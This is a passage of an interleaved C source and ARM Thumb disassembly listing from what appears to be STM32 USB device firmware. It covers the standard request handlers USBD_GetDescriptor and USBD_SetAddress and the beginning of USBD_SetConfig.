          USBD_CtlError(pdev, req);
 800ba7c:	6839      	ldr	r1, [r7, #0]
 800ba7e:	6878      	ldr	r0, [r7, #4]
 800ba80:	f000 fb7f 	bl	800c182 <USBD_CtlError>
          break;
 800ba84:	bf00      	nop
      }
      break;
 800ba86:	e005      	b.n	800ba94 <USBD_StdEPReq+0x330>

    default:
      USBD_CtlError(pdev, req);
 800ba88:	6839      	ldr	r1, [r7, #0]
 800ba8a:	6878      	ldr	r0, [r7, #4]
 800ba8c:	f000 fb79 	bl	800c182 <USBD_CtlError>
      break;
 800ba90:	e000      	b.n	800ba94 <USBD_StdEPReq+0x330>
      break;
 800ba92:	bf00      	nop
  }

  return ret;
 800ba94:	7bfb      	ldrb	r3, [r7, #15]
}
 800ba96:	4618      	mov	r0, r3
 800ba98:	3710      	adds	r7, #16
 800ba9a:	46bd      	mov	sp, r7
 800ba9c:	bd80      	pop	{r7, pc}
	...

0800baa0 <USBD_GetDescriptor>:
  * @param  pdev: device instance
  * @param  req: usb request
  * @retval status
  */
static void USBD_GetDescriptor(USBD_HandleTypeDef *pdev, USBD_SetupReqTypedef *req)
{
 800baa0:	b580      	push	{r7, lr}
 800baa2:	b084      	sub	sp, #16
 800baa4:	af00      	add	r7, sp, #0
 800baa6:	6078      	str	r0, [r7, #4]
 800baa8:	6039      	str	r1, [r7, #0]
  uint16_t len = 0U;
 800baaa:	2300      	movs	r3, #0
 800baac:	813b      	strh	r3, [r7, #8]
  uint8_t *pbuf = NULL;
 800baae:	2300      	movs	r3, #0
 800bab0:	60fb      	str	r3, [r7, #12]
  uint8_t err = 0U;
 800bab2:	2300      	movs	r3, #0
 800bab4:	72fb      	strb	r3, [r7, #11]

  switch (req->wValue >> 8)
 800bab6:	683b      	ldr	r3, [r7, #0]
 800bab8:	885b      	ldrh	r3, [r3, #2]
 800baba:	0a1b      	lsrs	r3, r3, #8
 800babc:	b29b      	uxth	r3, r3
 800babe:	3b01      	subs	r3, #1
 800bac0:	2b0e      	cmp	r3, #14
 800bac2:	f200 8152 	bhi.w	800bd6a <USBD_GetDescriptor+0x2ca>
 800bac6:	a201      	add	r2, pc, #4	; (adr r2, 800bacc <USBD_GetDescriptor+0x2c>)
 800bac8:	f852 f023 	ldr.w	pc, [r2, r3, lsl #2]
 800bacc:	0800bb3d 	.word	0x0800bb3d
 800bad0:	0800bb55 	.word	0x0800bb55
 800bad4:	0800bb95 	.word	0x0800bb95
 800bad8:	0800bd6b 	.word	0x0800bd6b
 800badc:	0800bd6b 	.word	0x0800bd6b
 800bae0:	0800bd0b 	.word	0x0800bd0b
 800bae4:	0800bd37 	.word	0x0800bd37
 800bae8:	0800bd6b 	.word	0x0800bd6b
 800baec:	0800bd6b 	.word	0x0800bd6b
 800baf0:	0800bd6b 	.word	0x0800bd6b
 800baf4:	0800bd6b 	.word	0x0800bd6b
 800baf8:	0800bd6b 	.word	0x0800bd6b
 800bafc:	0800bd6b 	.word	0x0800bd6b
 800bb00:	0800bd6b 	.word	0x0800bd6b
 800bb04:	0800bb09 	.word	0x0800bb09
  {
#if ((USBD_LPM_ENABLED == 1U) || (USBD_CLASS_BOS_ENABLED == 1U))
    case USB_DESC_TYPE_BOS:
      if (pdev->pDesc->GetBOSDescriptor != NULL)
 800bb08:	687b      	ldr	r3, [r7, #4]
 800bb0a:	f8d3 32b4 	ldr.w	r3, [r3, #692]	; 0x2b4
 800bb0e:	69db      	ldr	r3, [r3, #28]
 800bb10:	2b00      	cmp	r3, #0
 800bb12:	d00b      	beq.n	800bb2c <USBD_GetDescriptor+0x8c>
      {
        pbuf = pdev->pDesc->GetBOSDescriptor(pdev->dev_speed, &len);
 800bb14:	687b      	ldr	r3, [r7, #4]
 800bb16:	f8d3 32b4 	ldr.w	r3, [r3, #692]	; 0x2b4
 800bb1a:	69db      	ldr	r3, [r3, #28]
 800bb1c:	687a      	ldr	r2, [r7, #4]
 800bb1e:	7c12      	ldrb	r2, [r2, #16]
 800bb20:	f107 0108 	add.w	r1, r7, #8
 800bb24:	4610      	mov	r0, r2
 800bb26:	4798      	blx	r3
 800bb28:	60f8      	str	r0, [r7, #12]
      else
      {
        USBD_CtlError(pdev, req);
        err++;
      }
      break;
 800bb2a:	e126      	b.n	800bd7a <USBD_GetDescriptor+0x2da>
        USBD_CtlError(pdev, req);
 800bb2c:	6839      	ldr	r1, [r7, #0]
 800bb2e:	6878      	ldr	r0, [r7, #4]
 800bb30:	f000 fb27 	bl	800c182 <USBD_CtlError>
        err++;
 800bb34:	7afb      	ldrb	r3, [r7, #11]
 800bb36:	3301      	adds	r3, #1
 800bb38:	72fb      	strb	r3, [r7, #11]
      break;
 800bb3a:	e11e      	b.n	800bd7a <USBD_GetDescriptor+0x2da>
#endif /* (USBD_LPM_ENABLED == 1U) || (USBD_CLASS_BOS_ENABLED == 1U) */
    case USB_DESC_TYPE_DEVICE:
      pbuf = pdev->pDesc->GetDeviceDescriptor(pdev->dev_speed, &len);
 800bb3c:	687b      	ldr	r3, [r7, #4]
 800bb3e:	f8d3 32b4 	ldr.w	r3, [r3, #692]	; 0x2b4
 800bb42:	681b      	ldr	r3, [r3, #0]
 800bb44:	687a      	ldr	r2, [r7, #4]
 800bb46:	7c12      	ldrb	r2, [r2, #16]
 800bb48:	f107 0108 	add.w	r1, r7, #8
 800bb4c:	4610      	mov	r0, r2
 800bb4e:	4798      	blx	r3
 800bb50:	60f8      	str	r0, [r7, #12]
      break;
 800bb52:	e112      	b.n	800bd7a <USBD_GetDescriptor+0x2da>

    case USB_DESC_TYPE_CONFIGURATION:
      if (pdev->dev_speed == USBD_SPEED_HIGH)
 800bb54:	687b      	ldr	r3, [r7, #4]
 800bb56:	7c1b      	ldrb	r3, [r3, #16]
 800bb58:	2b00      	cmp	r3, #0
 800bb5a:	d10d      	bne.n	800bb78 <USBD_GetDescriptor+0xd8>
          pbuf   = (uint8_t *)USBD_CMPSIT.GetHSConfigDescriptor(&len);
        }
        else
#endif /* USE_USBD_COMPOSITE */
        {
          pbuf = (uint8_t *)pdev->pClass[0]->GetHSConfigDescriptor(&len);
 800bb5c:	687b      	ldr	r3, [r7, #4]
 800bb5e:	f8d3 32b8 	ldr.w	r3, [r3, #696]	; 0x2b8
 800bb62:	6a9b      	ldr	r3, [r3, #40]	; 0x28
 800bb64:	f107 0208 	add.w	r2, r7, #8
 800bb68:	4610      	mov	r0, r2
 800bb6a:	4798      	blx	r3
 800bb6c:	60f8      	str	r0, [r7, #12]
        }
        pbuf[1] = USB_DESC_TYPE_CONFIGURATION;
 800bb6e:	68fb      	ldr	r3, [r7, #12]
 800bb70:	3301      	adds	r3, #1
 800bb72:	2202      	movs	r2, #2
 800bb74:	701a      	strb	r2, [r3, #0]
        {
          pbuf   = (uint8_t *)pdev->pClass[0]->GetFSConfigDescriptor(&len);
        }
        pbuf[1] = USB_DESC_TYPE_CONFIGURATION;
      }
      break;
 800bb76:	e100      	b.n	800bd7a <USBD_GetDescriptor+0x2da>
          pbuf   = (uint8_t *)pdev->pClass[0]->GetFSConfigDescriptor(&len);
 800bb78:	687b      	ldr	r3, [r7, #4]
 800bb7a:	f8d3 32b8 	ldr.w	r3, [r3, #696]	; 0x2b8
 800bb7e:	6adb      	ldr	r3, [r3, #44]	; 0x2c
 800bb80:	f107 0208 	add.w	r2, r7, #8
 800bb84:	4610      	mov	r0, r2
 800bb86:	4798      	blx	r3
 800bb88:	60f8      	str	r0, [r7, #12]
        pbuf[1] = USB_DESC_TYPE_CONFIGURATION;
 800bb8a:	68fb      	ldr	r3, [r7, #12]
 800bb8c:	3301      	adds	r3, #1
 800bb8e:	2202      	movs	r2, #2
 800bb90:	701a      	strb	r2, [r3, #0]
      break;
 800bb92:	e0f2      	b.n	800bd7a <USBD_GetDescriptor+0x2da>

    case USB_DESC_TYPE_STRING:
      switch ((uint8_t)(req->wValue))
 800bb94:	683b      	ldr	r3, [r7, #0]
 800bb96:	885b      	ldrh	r3, [r3, #2]
 800bb98:	b2db      	uxtb	r3, r3
 800bb9a:	2b05      	cmp	r3, #5
 800bb9c:	f200 80ac 	bhi.w	800bcf8 <USBD_GetDescriptor+0x258>
 800bba0:	a201      	add	r2, pc, #4	; (adr r2, 800bba8 <USBD_GetDescriptor+0x108>)
 800bba2:	f852 f023 	ldr.w	pc, [r2, r3, lsl #2]
 800bba6:	bf00      	nop
 800bba8:	0800bbc1 	.word	0x0800bbc1
 800bbac:	0800bbf5 	.word	0x0800bbf5
 800bbb0:	0800bc29 	.word	0x0800bc29
 800bbb4:	0800bc5d 	.word	0x0800bc5d
 800bbb8:	0800bc91 	.word	0x0800bc91
 800bbbc:	0800bcc5 	.word	0x0800bcc5
      {
        case USBD_IDX_LANGID_STR:
          if (pdev->pDesc->GetLangIDStrDescriptor != NULL)
 800bbc0:	687b      	ldr	r3, [r7, #4]
 800bbc2:	f8d3 32b4 	ldr.w	r3, [r3, #692]	; 0x2b4
 800bbc6:	685b      	ldr	r3, [r3, #4]
 800bbc8:	2b00      	cmp	r3, #0
 800bbca:	d00b      	beq.n	800bbe4 <USBD_GetDescriptor+0x144>
          {
            pbuf = pdev->pDesc->GetLangIDStrDescriptor(pdev->dev_speed, &len);
 800bbcc:	687b      	ldr	r3, [r7, #4]
 800bbce:	f8d3 32b4 	ldr.w	r3, [r3, #692]	; 0x2b4
 800bbd2:	685b      	ldr	r3, [r3, #4]
 800bbd4:	687a      	ldr	r2, [r7, #4]
 800bbd6:	7c12      	ldrb	r2, [r2, #16]
 800bbd8:	f107 0108 	add.w	r1, r7, #8
 800bbdc:	4610      	mov	r0, r2
 800bbde:	4798      	blx	r3
 800bbe0:	60f8      	str	r0, [r7, #12]
          else
          {
            USBD_CtlError(pdev, req);
            err++;
          }
          break;
 800bbe2:	e091      	b.n	800bd08 <USBD_GetDescriptor+0x268>
            USBD_CtlError(pdev, req);
 800bbe4:	6839      	ldr	r1, [r7, #0]
 800bbe6:	6878      	ldr	r0, [r7, #4]
 800bbe8:	f000 facb 	bl	800c182 <USBD_CtlError>
            err++;
 800bbec:	7afb      	ldrb	r3, [r7, #11]
 800bbee:	3301      	adds	r3, #1
 800bbf0:	72fb      	strb	r3, [r7, #11]
          break;
 800bbf2:	e089      	b.n	800bd08 <USBD_GetDescriptor+0x268>

        case USBD_IDX_MFC_STR:
          if (pdev->pDesc->GetManufacturerStrDescriptor != NULL)
 800bbf4:	687b      	ldr	r3, [r7, #4]
 800bbf6:	f8d3 32b4 	ldr.w	r3, [r3, #692]	; 0x2b4
 800bbfa:	689b      	ldr	r3, [r3, #8]
 800bbfc:	2b00      	cmp	r3, #0
 800bbfe:	d00b      	beq.n	800bc18 <USBD_GetDescriptor+0x178>
          {
            pbuf = pdev->pDesc->GetManufacturerStrDescriptor(pdev->dev_speed, &len);
 800bc00:	687b      	ldr	r3, [r7, #4]
 800bc02:	f8d3 32b4 	ldr.w	r3, [r3, #692]	; 0x2b4
 800bc06:	689b      	ldr	r3, [r3, #8]
 800bc08:	687a      	ldr	r2, [r7, #4]
 800bc0a:	7c12      	ldrb	r2, [r2, #16]
 800bc0c:	f107 0108 	add.w	r1, r7, #8
 800bc10:	4610      	mov	r0, r2
 800bc12:	4798      	blx	r3
 800bc14:	60f8      	str	r0, [r7, #12]
          else
          {
            USBD_CtlError(pdev, req);
            err++;
          }
          break;
 800bc16:	e077      	b.n	800bd08 <USBD_GetDescriptor+0x268>
            USBD_CtlError(pdev, req);
 800bc18:	6839      	ldr	r1, [r7, #0]
 800bc1a:	6878      	ldr	r0, [r7, #4]
 800bc1c:	f000 fab1 	bl	800c182 <USBD_CtlError>
            err++;
 800bc20:	7afb      	ldrb	r3, [r7, #11]
 800bc22:	3301      	adds	r3, #1
 800bc24:	72fb      	strb	r3, [r7, #11]
          break;
 800bc26:	e06f      	b.n	800bd08 <USBD_GetDescriptor+0x268>

        case USBD_IDX_PRODUCT_STR:
          if (pdev->pDesc->GetProductStrDescriptor != NULL)
 800bc28:	687b      	ldr	r3, [r7, #4]
 800bc2a:	f8d3 32b4 	ldr.w	r3, [r3, #692]	; 0x2b4
 800bc2e:	68db      	ldr	r3, [r3, #12]
 800bc30:	2b00      	cmp	r3, #0
 800bc32:	d00b      	beq.n	800bc4c <USBD_GetDescriptor+0x1ac>
          {
            pbuf = pdev->pDesc->GetProductStrDescriptor(pdev->dev_speed, &len);
 800bc34:	687b      	ldr	r3, [r7, #4]
 800bc36:	f8d3 32b4 	ldr.w	r3, [r3, #692]	; 0x2b4
 800bc3a:	68db      	ldr	r3, [r3, #12]
 800bc3c:	687a      	ldr	r2, [r7, #4]
 800bc3e:	7c12      	ldrb	r2, [r2, #16]
 800bc40:	f107 0108 	add.w	r1, r7, #8
 800bc44:	4610      	mov	r0, r2
 800bc46:	4798      	blx	r3
 800bc48:	60f8      	str	r0, [r7, #12]
          else
          {
            USBD_CtlError(pdev, req);
            err++;
          }
          break;
 800bc4a:	e05d      	b.n	800bd08 <USBD_GetDescriptor+0x268>
            USBD_CtlError(pdev, req);
 800bc4c:	6839      	ldr	r1, [r7, #0]
 800bc4e:	6878      	ldr	r0, [r7, #4]
 800bc50:	f000 fa97 	bl	800c182 <USBD_CtlError>
            err++;
 800bc54:	7afb      	ldrb	r3, [r7, #11]
 800bc56:	3301      	adds	r3, #1
 800bc58:	72fb      	strb	r3, [r7, #11]
          break;
 800bc5a:	e055      	b.n	800bd08 <USBD_GetDescriptor+0x268>

        case USBD_IDX_SERIAL_STR:
          if (pdev->pDesc->GetSerialStrDescriptor != NULL)
 800bc5c:	687b      	ldr	r3, [r7, #4]
 800bc5e:	f8d3 32b4 	ldr.w	r3, [r3, #692]	; 0x2b4
 800bc62:	691b      	ldr	r3, [r3, #16]
 800bc64:	2b00      	cmp	r3, #0
 800bc66:	d00b      	beq.n	800bc80 <USBD_GetDescriptor+0x1e0>
          {
            pbuf = pdev->pDesc->GetSerialStrDescriptor(pdev->dev_speed, &len);
 800bc68:	687b      	ldr	r3, [r7, #4]
 800bc6a:	f8d3 32b4 	ldr.w	r3, [r3, #692]	; 0x2b4
 800bc6e:	691b      	ldr	r3, [r3, #16]
 800bc70:	687a      	ldr	r2, [r7, #4]
 800bc72:	7c12      	ldrb	r2, [r2, #16]
 800bc74:	f107 0108 	add.w	r1, r7, #8
 800bc78:	4610      	mov	r0, r2
 800bc7a:	4798      	blx	r3
 800bc7c:	60f8      	str	r0, [r7, #12]
          else
          {
            USBD_CtlError(pdev, req);
            err++;
          }
          break;
 800bc7e:	e043      	b.n	800bd08 <USBD_GetDescriptor+0x268>
            USBD_CtlError(pdev, req);
 800bc80:	6839      	ldr	r1, [r7, #0]
 800bc82:	6878      	ldr	r0, [r7, #4]
 800bc84:	f000 fa7d 	bl	800c182 <USBD_CtlError>
            err++;
 800bc88:	7afb      	ldrb	r3, [r7, #11]
 800bc8a:	3301      	adds	r3, #1
 800bc8c:	72fb      	strb	r3, [r7, #11]
          break;
 800bc8e:	e03b      	b.n	800bd08 <USBD_GetDescriptor+0x268>

        case USBD_IDX_CONFIG_STR:
          if (pdev->pDesc->GetConfigurationStrDescriptor != NULL)
 800bc90:	687b      	ldr	r3, [r7, #4]
 800bc92:	f8d3 32b4 	ldr.w	r3, [r3, #692]	; 0x2b4
 800bc96:	695b      	ldr	r3, [r3, #20]
 800bc98:	2b00      	cmp	r3, #0
 800bc9a:	d00b      	beq.n	800bcb4 <USBD_GetDescriptor+0x214>
          {
            pbuf = pdev->pDesc->GetConfigurationStrDescriptor(pdev->dev_speed, &len);
 800bc9c:	687b      	ldr	r3, [r7, #4]
 800bc9e:	f8d3 32b4 	ldr.w	r3, [r3, #692]	; 0x2b4
 800bca2:	695b      	ldr	r3, [r3, #20]
 800bca4:	687a      	ldr	r2, [r7, #4]
 800bca6:	7c12      	ldrb	r2, [r2, #16]
 800bca8:	f107 0108 	add.w	r1, r7, #8
 800bcac:	4610      	mov	r0, r2
 800bcae:	4798      	blx	r3
 800bcb0:	60f8      	str	r0, [r7, #12]
          else
          {
            USBD_CtlError(pdev, req);
            err++;
          }
          break;
 800bcb2:	e029      	b.n	800bd08 <USBD_GetDescriptor+0x268>
            USBD_CtlError(pdev, req);
 800bcb4:	6839      	ldr	r1, [r7, #0]
 800bcb6:	6878      	ldr	r0, [r7, #4]
 800bcb8:	f000 fa63 	bl	800c182 <USBD_CtlError>
            err++;
 800bcbc:	7afb      	ldrb	r3, [r7, #11]
 800bcbe:	3301      	adds	r3, #1
 800bcc0:	72fb      	strb	r3, [r7, #11]
          break;
 800bcc2:	e021      	b.n	800bd08 <USBD_GetDescriptor+0x268>

        case USBD_IDX_INTERFACE_STR:
          if (pdev->pDesc->GetInterfaceStrDescriptor != NULL)
 800bcc4:	687b      	ldr	r3, [r7, #4]
 800bcc6:	f8d3 32b4 	ldr.w	r3, [r3, #692]	; 0x2b4
 800bcca:	699b      	ldr	r3, [r3, #24]
 800bccc:	2b00      	cmp	r3, #0
 800bcce:	d00b      	beq.n	800bce8 <USBD_GetDescriptor+0x248>
          {
            pbuf = pdev->pDesc->GetInterfaceStrDescriptor(pdev->dev_speed, &len);
 800bcd0:	687b      	ldr	r3, [r7, #4]
 800bcd2:	f8d3 32b4 	ldr.w	r3, [r3, #692]	; 0x2b4
 800bcd6:	699b      	ldr	r3, [r3, #24]
 800bcd8:	687a      	ldr	r2, [r7, #4]
 800bcda:	7c12      	ldrb	r2, [r2, #16]
 800bcdc:	f107 0108 	add.w	r1, r7, #8
 800bce0:	4610      	mov	r0, r2
 800bce2:	4798      	blx	r3
 800bce4:	60f8      	str	r0, [r7, #12]
          else
          {
            USBD_CtlError(pdev, req);
            err++;
          }
          break;
 800bce6:	e00f      	b.n	800bd08 <USBD_GetDescriptor+0x268>
            USBD_CtlError(pdev, req);
 800bce8:	6839      	ldr	r1, [r7, #0]
 800bcea:	6878      	ldr	r0, [r7, #4]
 800bcec:	f000 fa49 	bl	800c182 <USBD_CtlError>
            err++;
 800bcf0:	7afb      	ldrb	r3, [r7, #11]
 800bcf2:	3301      	adds	r3, #1
 800bcf4:	72fb      	strb	r3, [r7, #11]
          break;
 800bcf6:	e007      	b.n	800bd08 <USBD_GetDescriptor+0x268>
            err++;
          }
#endif /* USBD_SUPPORT_USER_STRING_DESC  */

#if ((USBD_CLASS_USER_STRING_DESC == 0U) && (USBD_SUPPORT_USER_STRING_DESC == 0U))
          USBD_CtlError(pdev, req);
 800bcf8:	6839      	ldr	r1, [r7, #0]
 800bcfa:	6878      	ldr	r0, [r7, #4]
 800bcfc:	f000 fa41 	bl	800c182 <USBD_CtlError>
          err++;
 800bd00:	7afb      	ldrb	r3, [r7, #11]
 800bd02:	3301      	adds	r3, #1
 800bd04:	72fb      	strb	r3, [r7, #11]
#endif /* (USBD_CLASS_USER_STRING_DESC == 0U) && (USBD_SUPPORT_USER_STRING_DESC == 0U) */
          break;
 800bd06:	bf00      	nop
      }
      break;
 800bd08:	e037      	b.n	800bd7a <USBD_GetDescriptor+0x2da>

    case USB_DESC_TYPE_DEVICE_QUALIFIER:
      if (pdev->dev_speed == USBD_SPEED_HIGH)
 800bd0a:	687b      	ldr	r3, [r7, #4]
 800bd0c:	7c1b      	ldrb	r3, [r3, #16]
 800bd0e:	2b00      	cmp	r3, #0
 800bd10:	d109      	bne.n	800bd26 <USBD_GetDescriptor+0x286>
          pbuf = (uint8_t *)USBD_CMPSIT.GetDeviceQualifierDescriptor(&len);
        }
        else
#endif /* USE_USBD_COMPOSITE */
        {
          pbuf = (uint8_t *)pdev->pClass[0]->GetDeviceQualifierDescriptor(&len);
 800bd12:	687b      	ldr	r3, [r7, #4]
 800bd14:	f8d3 32b8 	ldr.w	r3, [r3, #696]	; 0x2b8
 800bd18:	6b5b      	ldr	r3, [r3, #52]	; 0x34
 800bd1a:	f107 0208 	add.w	r2, r7, #8
 800bd1e:	4610      	mov	r0, r2
 800bd20:	4798      	blx	r3
 800bd22:	60f8      	str	r0, [r7, #12]
      else
      {
        USBD_CtlError(pdev, req);
        err++;
      }
      break;
 800bd24:	e029      	b.n	800bd7a <USBD_GetDescriptor+0x2da>
        USBD_CtlError(pdev, req);
 800bd26:	6839      	ldr	r1, [r7, #0]
 800bd28:	6878      	ldr	r0, [r7, #4]
 800bd2a:	f000 fa2a 	bl	800c182 <USBD_CtlError>
        err++;
 800bd2e:	7afb      	ldrb	r3, [r7, #11]
 800bd30:	3301      	adds	r3, #1
 800bd32:	72fb      	strb	r3, [r7, #11]
      break;
 800bd34:	e021      	b.n	800bd7a <USBD_GetDescriptor+0x2da>

    case USB_DESC_TYPE_OTHER_SPEED_CONFIGURATION:
      if (pdev->dev_speed == USBD_SPEED_HIGH)
 800bd36:	687b      	ldr	r3, [r7, #4]
 800bd38:	7c1b      	ldrb	r3, [r3, #16]
 800bd3a:	2b00      	cmp	r3, #0
 800bd3c:	d10d      	bne.n	800bd5a <USBD_GetDescriptor+0x2ba>
          pbuf = (uint8_t *)USBD_CMPSIT.GetOtherSpeedConfigDescriptor(&len);
        }
        else
#endif /* USE_USBD_COMPOSITE */
        {
          pbuf = (uint8_t *)pdev->pClass[0]->GetOtherSpeedConfigDescriptor(&len);
 800bd3e:	687b      	ldr	r3, [r7, #4]
 800bd40:	f8d3 32b8 	ldr.w	r3, [r3, #696]	; 0x2b8
 800bd44:	6b1b      	ldr	r3, [r3, #48]	; 0x30
 800bd46:	f107 0208 	add.w	r2, r7, #8
 800bd4a:	4610      	mov	r0, r2
 800bd4c:	4798      	blx	r3
 800bd4e:	60f8      	str	r0, [r7, #12]
        }
        pbuf[1] = USB_DESC_TYPE_OTHER_SPEED_CONFIGURATION;
 800bd50:	68fb      	ldr	r3, [r7, #12]
 800bd52:	3301      	adds	r3, #1
 800bd54:	2207      	movs	r2, #7
 800bd56:	701a      	strb	r2, [r3, #0]
      else
      {
        USBD_CtlError(pdev, req);
        err++;
      }
      break;
 800bd58:	e00f      	b.n	800bd7a <USBD_GetDescriptor+0x2da>
        USBD_CtlError(pdev, req);
 800bd5a:	6839      	ldr	r1, [r7, #0]
 800bd5c:	6878      	ldr	r0, [r7, #4]
 800bd5e:	f000 fa10 	bl	800c182 <USBD_CtlError>
        err++;
 800bd62:	7afb      	ldrb	r3, [r7, #11]
 800bd64:	3301      	adds	r3, #1
 800bd66:	72fb      	strb	r3, [r7, #11]
      break;
 800bd68:	e007      	b.n	800bd7a <USBD_GetDescriptor+0x2da>

    default:
      USBD_CtlError(pdev, req);
 800bd6a:	6839      	ldr	r1, [r7, #0]
 800bd6c:	6878      	ldr	r0, [r7, #4]
 800bd6e:	f000 fa08 	bl	800c182 <USBD_CtlError>
      err++;
 800bd72:	7afb      	ldrb	r3, [r7, #11]
 800bd74:	3301      	adds	r3, #1
 800bd76:	72fb      	strb	r3, [r7, #11]
      break;
 800bd78:	bf00      	nop
  }

  if (err != 0U)
 800bd7a:	7afb      	ldrb	r3, [r7, #11]
 800bd7c:	2b00      	cmp	r3, #0
 800bd7e:	d11e      	bne.n	800bdbe <USBD_GetDescriptor+0x31e>
  {
    return;
  }

  if (req->wLength != 0U)
 800bd80:	683b      	ldr	r3, [r7, #0]
 800bd82:	88db      	ldrh	r3, [r3, #6]
 800bd84:	2b00      	cmp	r3, #0
 800bd86:	d016      	beq.n	800bdb6 <USBD_GetDescriptor+0x316>
  {
    if (len != 0U)
 800bd88:	893b      	ldrh	r3, [r7, #8]
 800bd8a:	2b00      	cmp	r3, #0
 800bd8c:	d00e      	beq.n	800bdac <USBD_GetDescriptor+0x30c>
    {
      len = MIN(len, req->wLength);
 800bd8e:	683b      	ldr	r3, [r7, #0]
 800bd90:	88da      	ldrh	r2, [r3, #6]
 800bd92:	893b      	ldrh	r3, [r7, #8]
 800bd94:	4293      	cmp	r3, r2
 800bd96:	bf28      	it	cs
 800bd98:	4613      	movcs	r3, r2
 800bd9a:	b29b      	uxth	r3, r3
 800bd9c:	813b      	strh	r3, [r7, #8]
      (void)USBD_CtlSendData(pdev, pbuf, len);
 800bd9e:	893b      	ldrh	r3, [r7, #8]
 800bda0:	461a      	mov	r2, r3
 800bda2:	68f9      	ldr	r1, [r7, #12]
 800bda4:	6878      	ldr	r0, [r7, #4]
 800bda6:	f000 fa5d 	bl	800c264 <USBD_CtlSendData>
 800bdaa:	e009      	b.n	800bdc0 <USBD_GetDescriptor+0x320>
    }
    else
    {
      USBD_CtlError(pdev, req);
 800bdac:	6839      	ldr	r1, [r7, #0]
 800bdae:	6878      	ldr	r0, [r7, #4]
 800bdb0:	f000 f9e7 	bl	800c182 <USBD_CtlError>
 800bdb4:	e004      	b.n	800bdc0 <USBD_GetDescriptor+0x320>
    }
  }
  else
  {
    (void)USBD_CtlSendStatus(pdev);
 800bdb6:	6878      	ldr	r0, [r7, #4]
 800bdb8:	f000 faae 	bl	800c318 <USBD_CtlSendStatus>
 800bdbc:	e000      	b.n	800bdc0 <USBD_GetDescriptor+0x320>
    return;
 800bdbe:	bf00      	nop
  }
}
 800bdc0:	3710      	adds	r7, #16
 800bdc2:	46bd      	mov	sp, r7
 800bdc4:	bd80      	pop	{r7, pc}
 800bdc6:	bf00      	nop

0800bdc8 <USBD_SetAddress>:
  * @param  pdev: device instance
  * @param  req: usb request
  * @retval status
  */
static void USBD_SetAddress(USBD_HandleTypeDef *pdev, USBD_SetupReqTypedef *req)
{
 800bdc8:	b580      	push	{r7, lr}
 800bdca:	b084      	sub	sp, #16
 800bdcc:	af00      	add	r7, sp, #0
 800bdce:	6078      	str	r0, [r7, #4]
 800bdd0:	6039      	str	r1, [r7, #0]
  uint8_t  dev_addr;

  if ((req->wIndex == 0U) && (req->wLength == 0U) && (req->wValue < 128U))
 800bdd2:	683b      	ldr	r3, [r7, #0]
 800bdd4:	889b      	ldrh	r3, [r3, #4]
 800bdd6:	2b00      	cmp	r3, #0
 800bdd8:	d131      	bne.n	800be3e <USBD_SetAddress+0x76>
 800bdda:	683b      	ldr	r3, [r7, #0]
 800bddc:	88db      	ldrh	r3, [r3, #6]
 800bdde:	2b00      	cmp	r3, #0
 800bde0:	d12d      	bne.n	800be3e <USBD_SetAddress+0x76>
 800bde2:	683b      	ldr	r3, [r7, #0]
 800bde4:	885b      	ldrh	r3, [r3, #2]
 800bde6:	2b7f      	cmp	r3, #127	; 0x7f
 800bde8:	d829      	bhi.n	800be3e <USBD_SetAddress+0x76>
  {
    dev_addr = (uint8_t)(req->wValue) & 0x7FU;
 800bdea:	683b      	ldr	r3, [r7, #0]
 800bdec:	885b      	ldrh	r3, [r3, #2]
 800bdee:	b2db      	uxtb	r3, r3
 800bdf0:	f003 037f 	and.w	r3, r3, #127	; 0x7f
 800bdf4:	73fb      	strb	r3, [r7, #15]

    if (pdev->dev_state == USBD_STATE_CONFIGURED)
 800bdf6:	687b      	ldr	r3, [r7, #4]
 800bdf8:	f893 329c 	ldrb.w	r3, [r3, #668]	; 0x29c
 800bdfc:	b2db      	uxtb	r3, r3
 800bdfe:	2b03      	cmp	r3, #3
 800be00:	d104      	bne.n	800be0c <USBD_SetAddress+0x44>
    {
      USBD_CtlError(pdev, req);
 800be02:	6839      	ldr	r1, [r7, #0]
 800be04:	6878      	ldr	r0, [r7, #4]
 800be06:	f000 f9bc 	bl	800c182 <USBD_CtlError>
    if (pdev->dev_state == USBD_STATE_CONFIGURED)
 800be0a:	e01d      	b.n	800be48 <USBD_SetAddress+0x80>
    }
    else
    {
      pdev->dev_address = dev_addr;
 800be0c:	687b      	ldr	r3, [r7, #4]
 800be0e:	7bfa      	ldrb	r2, [r7, #15]
 800be10:	f883 229e 	strb.w	r2, [r3, #670]	; 0x29e
      (void)USBD_LL_SetUSBAddress(pdev, dev_addr);
 800be14:	7bfb      	ldrb	r3, [r7, #15]
 800be16:	4619      	mov	r1, r3
 800be18:	6878      	ldr	r0, [r7, #4]
 800be1a:	f000 ffbf 	bl	800cd9c <USBD_LL_SetUSBAddress>
      (void)USBD_CtlSendStatus(pdev);
 800be1e:	6878      	ldr	r0, [r7, #4]
 800be20:	f000 fa7a 	bl	800c318 <USBD_CtlSendStatus>

      if (dev_addr != 0U)
 800be24:	7bfb      	ldrb	r3, [r7, #15]
 800be26:	2b00      	cmp	r3, #0
 800be28:	d004      	beq.n	800be34 <USBD_SetAddress+0x6c>
      {
        pdev->dev_state = USBD_STATE_ADDRESSED;
 800be2a:	687b      	ldr	r3, [r7, #4]
 800be2c:	2202      	movs	r2, #2
 800be2e:	f883 229c 	strb.w	r2, [r3, #668]	; 0x29c
    if (pdev->dev_state == USBD_STATE_CONFIGURED)
 800be32:	e009      	b.n	800be48 <USBD_SetAddress+0x80>
      }
      else
      {
        pdev->dev_state = USBD_STATE_DEFAULT;
 800be34:	687b      	ldr	r3, [r7, #4]
 800be36:	2201      	movs	r2, #1
 800be38:	f883 229c 	strb.w	r2, [r3, #668]	; 0x29c
    if (pdev->dev_state == USBD_STATE_CONFIGURED)
 800be3c:	e004      	b.n	800be48 <USBD_SetAddress+0x80>
      }
    }
  }
  else
  {
    USBD_CtlError(pdev, req);
 800be3e:	6839      	ldr	r1, [r7, #0]
 800be40:	6878      	ldr	r0, [r7, #4]
 800be42:	f000 f99e 	bl	800c182 <USBD_CtlError>
  }
}
 800be46:	bf00      	nop
 800be48:	bf00      	nop
 800be4a:	3710      	adds	r7, #16
 800be4c:	46bd      	mov	sp, r7
 800be4e:	bd80      	pop	{r7, pc}

0800be50 <USBD_SetConfig>:
  * @param  pdev: device instance
  * @param  req: usb request
  * @retval status
  */
static USBD_StatusTypeDef USBD_SetConfig(USBD_HandleTypeDef *pdev, USBD_SetupReqTypedef *req)
{
 800be50:	b580      	push	{r7, lr}
 800be52:	b084      	sub	sp, #16
 800be54:	af00      	add	r7, sp, #0
